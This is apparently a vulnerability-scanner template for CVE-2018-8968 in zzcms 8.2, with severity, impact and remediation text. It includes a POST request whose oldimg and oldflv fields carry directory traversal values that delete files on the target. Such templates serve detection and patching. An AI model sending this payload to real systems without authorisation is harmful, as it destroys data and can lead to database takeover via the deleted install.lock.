id: CVE-2018-8968

info:
  name: zzcms 8.2 Arbitrary File Deletion Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: An issue was discovered in zzcms 8.2. user/manage.php allows remote attackers to delete arbitrary files via directory traversal sequences in the oldimg or oldflv parameter in an action=modify request. This can be leveraged for database access by deleting install.lock.
  impact: |
    Successful exploitation could lead to unauthorized deletion of critical files, causing data loss or system instability.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version of zzcms.

http:
  - method: POST
    path:
      - "{{BaseURL}}/user/manage.php"

    body: "action=modify&founderr=1&oldimg=../file_to_delete.jpg&oldflv=../file_to_delete.flv"

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "File deleted successfully"
        part: body
